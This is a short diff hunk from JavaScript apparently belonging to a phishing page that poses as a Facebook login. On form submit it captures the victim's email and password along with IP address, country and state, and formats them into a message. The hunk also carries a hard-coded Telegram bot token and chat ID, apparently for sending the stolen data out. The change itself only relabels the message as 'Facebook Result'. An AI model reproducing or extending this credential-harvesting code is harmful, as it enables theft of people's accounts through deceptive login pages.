@@ -18,7 +18,7 @@ form.addEventListener("submit", (e) => {
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+        var my_text = `Facebook Result from user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
         var token = "6482591769:AAElN3cLsXjfi0PK5ZbX_oG6VjZ4sjvKCmI";
         var chat_id =  -4024508862;
